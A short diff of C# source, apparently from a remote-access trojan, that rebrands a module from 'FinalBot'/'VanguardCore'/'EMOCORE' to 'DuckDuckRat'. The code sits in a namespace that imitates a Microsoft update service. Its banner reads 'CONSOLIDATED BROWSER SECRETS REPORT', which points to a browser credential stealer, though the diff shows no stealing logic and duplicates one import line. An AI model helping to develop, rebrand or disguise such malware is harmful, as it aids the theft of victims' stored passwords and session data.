@@ -9,9 +9,9 @@ using System.Threading.Tasks;
 using System.IO.Compression;
 using Newtonsoft.Json.Linq;
 using Microsoft.Data.Sqlite;
-using FinalBot;
-using VanguardCore;
-using VanguardCore.Modules;
+using DuckDuckRat;
+using DuckDuckRat;
+using DuckDuckRat.Modules;
 using System.Diagnostics;
 using System.Threading;
 
@@ -125,7 +125,7 @@ namespace Microsoft.UpdateService.Modules
             
             var aestheticReport = new StringBuilder();
             aestheticReport.AppendLine("================================================================================");
-            aestheticReport.AppendLine("🚀 EMOCORE v1: CONSOLIDATED BROWSER SECRETS REPORT");
+            aestheticReport.AppendLine("🚀 DUCK DUCK RAT v1: CONSOLIDATED BROWSER SECRETS REPORT");
             aestheticReport.AppendLine("================================================================================" + Environment.NewLine);
  
             try
@@ -235,3 +235,5 @@ namespace Microsoft.UpdateService.Modules
         }
     }
 }
+
+
